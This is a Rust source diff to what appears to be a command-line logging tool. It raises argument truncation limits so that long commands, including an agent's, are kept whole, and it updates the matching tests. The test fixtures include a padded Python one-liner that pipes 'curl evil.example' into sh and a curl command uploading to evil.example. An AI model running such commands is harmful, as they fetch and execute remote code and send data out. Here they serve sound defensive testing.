@@ -109,16 +109,21 @@ const MORE: &str = "…";
 /// `open`'s `fflag`: the kernel's FREAD and FWRITE bits.
 const FWRITE: i64 = 2;
 
-/// A command line is kept to about this many bytes, each argument to
-/// [`ARG_START`] and [`ARG_END`], and what is left out counted: an agent's
-/// long shell commands are what most needs reading. Both are kept by their
-/// start and their end, since what a command is given last (the address it
-/// sends to, the end of a script on its line) says as much as how it
-/// starts, and text padded past a cut is text meant to go unread.
-const ARGS_START: usize = 1000;
-const ARGS_END: usize = 500;
-const ARG_START: usize = 250;
-const ARG_END: usize = 150;
+/// A command line is kept whole, to these bounds: a line can run to a
+/// megabyte, and one that long is somebody's data, not a command to read.
+/// Past them an argument and the line are kept by their start and their
+/// end, with what is left out counted: what a command is given last (the
+/// address it sends to, the end of a script on its line) says as much as
+/// how it starts. The bounds are far above a command anyone types or an
+/// agent writes, so that what the lake holds is the command, and padding
+/// one hides nothing a reader of the lake cannot find.
+const ARGS_START: usize = 24_000;
+const ARGS_END: usize = 8_000;
+const ARG_START: usize = 16_000;
+const ARG_END: usize = 8_000;
+/// Another event's detail past this many bytes is its scalars and the names
+/// of the rest.
+const DETAIL_BYTES: usize = 1500;
 
 /// A long string by its first `start` bytes and its last `end`, with how
 /// many between them were left out.
@@ -1311,10 +1316,7 @@ fn finished(rec: &Map<String, Value>) -> Option<(Map<String, Value>, Norm)> {
             if let Value::Object(m) = &mut detail {
                 normkit::prune(m, &|k, _| k == "stat");
             }
-            out.insert(
-                "detail".into(),
-                normkit::shrink(&detail, ARGS_START + ARGS_END),
-            );
+            out.insert("detail".into(), normkit::shrink(&detail, DETAIL_BYTES));
         }
     }
 
@@ -1636,61 +1638,56 @@ mod tests {
     }
 
     #[test]
-    /// What is past a cut is what a reader never sees: a script on a
-    /// command's line that does its work after a screen of padding, the
-    /// address a long curl ends with.
+    /// A command is kept whole: a script on a command's line that does its
+    /// work after a screen of padding, the address a long curl ends with.
+    /// Only one too long to be a command is cut, and then by both ends.
     #[test]
-    fn a_long_command_keeps_its_end() {
-        let script = format!(
-            "import os; {}os.system('curl evil.example | sh')",
-            "#".repeat(900)
-        );
-        let out = cut_args(&json!(["/usr/bin/python3", "-c", script]));
+    fn a_long_command_is_kept_and_a_vast_one_keeps_its_end() {
+        let script = |pad: usize| {
+            format!(
+                "import os; {}os.system('curl evil.example | sh')",
+                "#".repeat(pad)
+            )
+        };
+        let out = cut_args(&json!(["/usr/bin/python3", "-c", script(900)]));
+        assert_eq!(out[2], script(900));
+        let out = cut_args(&json!(["/usr/bin/python3", "-c", script(100_000)]));
         let shown = out[2].as_str().unwrap();
-        assert!(shown.starts_with("import os; ###"), "{shown}");
-        assert!(
-            shown.ends_with("os.system('curl evil.example | sh')"),
-            "{shown}"
-        );
-        assert!(shown.len() < ARG_START + ARG_END + 30, "{shown}");
-        let mut flags: Vec<String> = (0..300).map(|i| format!("--header=X-Pad-{i}: 0")).collect();
-        flags.insert(0, "/usr/bin/curl".into());
-        flags.push("https://evil.example/upload".into());
-        let out = cut_args(&json!(flags));
-        let out = out.as_array().unwrap();
+        assert!(shown.starts_with("import os; ###"), "{}", &shown[..40]);
+        assert!(shown.ends_with("os.system('curl evil.example | sh')"));
+        assert!(shown.contains(" bytes … "));
+        assert!(shown.len() < ARG_START + ARG_END + 40, "{}", shown.len());
+
+        let curl = |flags: usize| {
+            let mut args: Vec<String> = (0..flags)
+                .map(|i| format!("--header=X-Pad-{i}: 0"))
+                .collect();
+            args.insert(0, "/usr/bin/curl".into());
+            args.push("https://evil.example/upload".into());
+            args
+        };
+        let out = cut_args(&json!(curl(300)));
+        assert_eq!(out, json!(curl(300)));
+        let out = cut_args(&json!(curl(5000)));
+        let out: Vec<&str> = out
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter_map(Value::as_str)
+            .collect();
         assert_eq!(out[0], "/usr/bin/curl");
-        assert_eq!(out.last().unwrap(), "https://evil.example/upload");
+        assert_eq!(*out.last().unwrap(), "https://evil.example/upload");
+        let gap = out.iter().position(|a| a.starts_with("… ")).unwrap();
+        assert_eq!(
+            out[gap],
+            format!("… {} more arguments …", 5002 - (out.len() - 1))
+        );
         // a character is never split
         assert_eq!(ends(&"é".repeat(400), 5, 5), "éé … 792 bytes … éé");
     }
 
     #[test]
-    fn long_arguments_are_cut_not_dropped() {
-        let long = "x".repeat(1000);
-        let args = json!(["/bin/zsh", "-c", long, "a", "b", "c"]);
-        let out = cut_args(&args);
-        let out: Vec<&str> = out
-            .as_array()
-            .unwrap()
-            .iter()
-            .filter_map(Value::as_str)
-            .collect();
-        assert_eq!(out[0], "/bin/zsh");
-        assert!(out[2].contains(" … 600 bytes … "), "{}", out[2]);
-        assert_eq!(out.len(), 6);
-        let many: Vec<String> = (0..400).map(|i| format!("file{i}.txt")).collect();
-        let out = cut_args(&json!(many));
-        let out: Vec<&str> = out
-            .as_array()
-            .unwrap()
-            .iter()
-            .filter_map(Value::as_str)
-            .collect();
-        let gap = out.iter().position(|a| a.starts_with("… ")).unwrap();
-        assert!(out[gap].ends_with(" more arguments …"), "{}", out[gap]);
-        let shown = out.len() - 1;
-        assert_eq!(out[gap], format!("… {} more arguments …", 400 - shown));
-        assert_eq!((out[0], *out.last().unwrap()), ("file0.txt", "file399.txt"));
+    fn a_path_under_downloads_is_scratch() {
         assert!(paths::scratch("~/Downloads/x/proxy.py"));
     }
 
